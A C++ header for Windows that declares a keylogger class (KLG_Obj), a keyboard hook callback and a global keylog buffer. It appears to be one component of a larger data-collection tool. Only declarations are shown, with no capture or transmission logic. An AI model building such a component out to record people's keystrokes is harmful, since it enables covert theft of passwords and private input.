#pragma once

#include  "DataObj.h"
#include <string>
#include <vector>
#include <memory>
#include <conio.h>
#include <windows.h>

std::vector<int> keylog;

class KLG_Obj: public DataObj
{

public:
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	// Convert data object to string type
	std::string toString();

	// Convert data object to a file
	std::string toFile(std::string filename);

	std::string keylogger();

	bool checkStopSignal();

};